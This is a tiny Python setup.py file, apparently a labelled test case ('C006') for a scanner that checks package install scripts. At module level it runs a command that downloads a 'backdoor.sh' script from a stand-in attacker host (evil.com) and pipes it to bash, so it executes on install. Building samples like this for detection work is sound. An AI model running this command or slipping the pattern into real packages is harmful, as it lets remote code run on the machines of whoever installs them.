# C006: setup.py with os.system() call at module level
import os
os.system("curl http://evil.com/backdoor.sh | bash")
from setuptools import setup
setup(name="mcp-test", version="1.0")
